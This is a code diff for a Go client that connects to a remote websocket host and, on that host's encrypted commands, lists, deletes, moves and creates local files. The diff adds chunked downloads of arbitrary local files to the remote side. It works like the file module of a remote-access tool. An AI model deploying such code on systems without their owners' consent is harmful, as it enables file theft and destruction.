@@ -18,6 +18,8 @@ import (
 const host = "67worker.lu2000luk.com"
 const prefix = "\x1b[35;1m[+]\x1b[0m\x1b[37m "
 
+var transfers = make(map[string]string) // [id]:[path]
+
 type TransferChunkRange struct {
 	RangeStart int64 `json:"s"`
 	RangeEnd   int64 `json:"e"`
@@ -227,6 +229,12 @@ func main() {
 
 			if com.Command == "ping" {
 				log.Printf(prefix + "Received ping")
+				resp := GenericResponse{
+					Success: true,
+					Type:    "ping",
+				}
+
+				MarshallAndSend(resp, c, key)
 				continue
 			}
 
@@ -236,22 +244,8 @@ func main() {
 				}
 				log.Printf(prefix+"Received ls command for %s", com.Target)
 				resp := ListDirectory(com.Target)
-				jsonresp, err := json.Marshal(resp)
 
-				if err != nil {
-					fmt.Println(prefix+"Error while marshalling ls response:", err)
-				}
-				fmt.Println(string(jsonresp))
-
-				encrypted, err := Encrypt(jsonresp, key)
-				if err != nil {
-					fmt.Println(prefix+"Error while encrypting ls response:", err)
-				}
-
-				err = c.WriteMessage(websocket.BinaryMessage, encrypted)
-				if err != nil {
-					log.Println(prefix+"Error while writing ls response:", err)
-				}
+				MarshallAndSend(resp, c, key)
 			}
 
 			if com.Command == "rm" {
@@ -265,22 +259,8 @@ func main() {
 					Success: err == nil,
 					Type:    "rm",
 				}
-				jsonresp, err := json.Marshal(resp)
 
-				if err != nil {
-					fmt.Println(prefix+"Error while marshalling rm response:", err)
-				}
-				fmt.Println(string(jsonresp))
-
-				encrypted, err := Encrypt(jsonresp, key)
-				if err != nil {
-					fmt.Println(prefix+"Error while encrypting rm response:", err)
-				}
-
-				err = c.WriteMessage(websocket.BinaryMessage, encrypted)
-				if err != nil {
-					log.Println(prefix+"Error while writing rm response:", err)
-				}
+				MarshallAndSend(resp, c, key)
 			}
 
 			if com.Command == "mv" {
@@ -294,22 +274,8 @@ func main() {
 					Success: err == nil,
 					Type:    "mv",
 				}
-				jsonresp, err := json.Marshal(resp)
 
-				if err != nil {
-					fmt.Println(prefix+"Error while marshalling mv response:", err)
-				}
-				fmt.Println(string(jsonresp))
-
-				encrypted, err := Encrypt(jsonresp, key)
-				if err != nil {
-					fmt.Println(prefix+"Error while encrypting mv response:", err)
-				}
-
-				err = c.WriteMessage(websocket.BinaryMessage, encrypted)
-				if err != nil {
-					log.Println(prefix+"Error while writing mv response:", err)
-				}
+				MarshallAndSend(resp, c, key)
 			}
 
 			if com.Command == "mkdir" {
@@ -324,27 +290,52 @@ func main() {
 					Success: err == nil,
 					Type:    "mkdir",
 				}
-				jsonresp, err := json.Marshal(resp)
 
-				if err != nil {
-					fmt.Println(prefix+"Error while marshalling mkdir response:", err)
-				}
-				fmt.Println(string(jsonresp))
-
-				encrypted, err := Encrypt(jsonresp, key)
-				if err != nil {
-					fmt.Println(prefix+"Error while encrypting mkdir response:", err)
-				}
-
-				err = c.WriteMessage(websocket.BinaryMessage, encrypted)
-				if err != nil {
-					log.Println(prefix+"Error while writing mkdir response:", err)
-				}
+				MarshallAndSend(resp, c, key)
 			}
 
 			if com.Command == "get" {
 				if com.Target == "" {
 					log.Printf(prefix + "Missing path for get")
+				}
+
+				log.Printf(prefix+"Received get command for %s", com.Target)
+
+				absPath, err := filepath.Abs(filepath.Clean(com.Target))
+				if err != nil {
+					absPath = com.Target // fallback
+				}
+
+				info, err := os.Stat(absPath)
+				if err != nil || info.IsDir() {
+					log.Printf(prefix+"Invalid path for get: %s", absPath)
+					continue
+				}
+
+				transferId := GenerateRandomString(12)
+				transfers[transferId] = absPath
+
+				resp := GETResponse{
+					Success:    true,
+					Name:       info.Name(),
+					TransferId: transferId,
+					Type:       "get",
+				}
+				jsonresp, err := json.Marshal(resp)
+
+				if err != nil {
+					fmt.Println(prefix+"Error while marshalling get response:", err)
+				}
+				fmt.Println(string(jsonresp))
+
+				encrypted, err := Encrypt(jsonresp, key)
+				if err != nil {
+					fmt.Println(prefix+"Error while encrypting get response:", err)
+				}
+
+				err = c.WriteMessage(websocket.BinaryMessage, encrypted)
+				if err != nil {
+					log.Println(prefix+"Error while writing get response:", err)
 				}
 			}
 
@@ -364,34 +355,88 @@ func main() {
 					Success: err == nil,
 					Type:    "copy",
 				}
-				jsonresp, err := json.Marshal(resp)
-
-				if err != nil {
-					fmt.Println(prefix+"Error while marshalling copy response:", err)
-				}
-				fmt.Println(string(jsonresp))
-
-				encrypted, err := Encrypt(jsonresp, key)
-				if err != nil {
-					fmt.Println(prefix+"Error while encrypting copy response:", err)
-				}
-
-				err = c.WriteMessage(websocket.BinaryMessage, encrypted)
-				if err != nil {
-					log.Println(prefix+"Error while writing copy response:", err)
-				}
+				MarshallAndSend(resp, c, key)
 			}
 
 			if com.Command == "upload" {
 				if com.Target == "" {
 					log.Printf(prefix + "Missing path for upload")
 				}
+
+				log.Printf(prefix+"Received upload command for %s", com.Target)
+
+				absPath, err := filepath.Abs(filepath.Clean(com.Target))
+				if err != nil {
+					absPath = com.Target // fallback
+				}
+
+				info, err := os.Stat(absPath) // dont check for error since the file might not exist yet (for new files)
+
+				if info.IsDir() {
+					log.Printf(prefix+"Invalid path for upload: %s", absPath)
+					continue
+				}
+
+				transferId := GenerateRandomString(12)
+				transfers[transferId] = absPath
+
+				resp := UploadResponse{
+					Success:    true,
+					TransferId: transferId,
+					Type:       "upload",
+				}
+				MarshallAndSend(resp, c, key)
 			}
 
 			if com.Command == "uploadChunk" {
 				if com.UploadData.TransferId == "" {
 					log.Printf(prefix + "Missing ID for uploadChunk")
 				}
+			}
+
+			if com.Command == "getChunk" {
+				if com.Target == "" {
+					log.Printf(prefix + "Missing ID for getChunk")
+				}
+
+				transferId := com.Target
+				filePath, exists := transfers[transferId]
+				if !exists {
+					log.Printf(prefix+"Invalid transfer ID for getChunk: %s", transferId)
+					continue
+				}
+
+				if com.GetChunkRange.RangeEnd-com.GetChunkRange.RangeStart > 10*1024*1024 {
+					log.Printf(prefix+"Requested chunk size exceeds 10MB for transfer ID: %s", transferId)
+					continue
+				}
+
+				isEnd := false
+				rangeEnd := com.GetChunkRange.RangeEnd
+				info, err := os.Stat(filePath)
+				if err == nil && rangeEnd >= info.Size()-1 {
+					isEnd = true
+					rangeEnd = info.Size() - 1
+				}
+
+				content, err := GetFileContentRange(filePath, com.GetChunkRange.RangeStart, rangeEnd)
+				if err != nil {
+					log.Printf(prefix+"Error while reading file chunk: %v", err)
+					continue
+				}
+
+				chunkResp := TransferChunk{
+					TransferId: transferId,
+					Chunkrange: TransferChunkRange{
+						RangeStart: com.GetChunkRange.RangeStart,
+						RangeEnd:   rangeEnd,
+					},
+					Content: content,
+					Type:    "getChunk",
+					IsEnd:   isEnd,
+				}
+
+				MarshallAndSend(chunkResp, c, key)
 			}
 
 			log.Printf(prefix+"Message: %s", d)
